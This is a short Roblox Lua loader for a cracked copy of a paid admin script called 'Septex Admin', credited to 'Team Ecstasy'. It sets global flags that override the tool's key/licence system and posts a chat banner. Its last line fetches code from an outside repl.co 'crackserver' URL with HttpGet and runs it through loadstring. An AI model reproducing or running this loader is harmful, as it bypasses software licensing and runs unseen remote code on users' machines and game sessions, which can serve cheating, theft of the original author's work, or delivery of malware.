--[[
   ▄████████  ▄████████    ▄████████     ███        ▄████████    ▄████████ ▄██   ▄   
  ███    ███ ███    ███   ███    ███ ▀█████████▄   ███    ███   ███    ███ ███   ██▄ 
  ███    █▀  ███    █▀    ███    █▀     ▀███▀▀██   ███    ███   ███    █▀  ███▄▄▄███ 
 ▄███▄▄▄     ███          ███            ███   ▀   ███    ███   ███        ▀▀▀▀▀▀███ 
▀▀███▀▀▀     ███        ▀███████████     ███     ▀███████████ ▀███████████ ▄██   ███ 
  ███    █▄  ███    █▄           ███     ███       ███    ███          ███ ███   ███ 
  ███    ███ ███    ███    ▄█    ███     ███       ███    ███    ▄█    ███ ███   ███ 
  ██████████ ████████▀   ▄████████▀     ▄████▀     ███    █▀   ▄████████▀   ▀█████▀  

                                  Septex Admin          
                              Cracked by Team Ecstasy
]]

_G.SEPTEX_SERVER_STATUS = true
_G.OVERRIDE_KEY_SYSTEM = true

game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
    Text = "[😎] Septex Admin cracked by Team Ecstasy",
    Font = Enum.Font.Arcade,
    Color = BrickColor.new("Gold").Color
})
loadstring(game:HttpGet("https://crackserver.mrelxs.repl.co/septex/client", true))
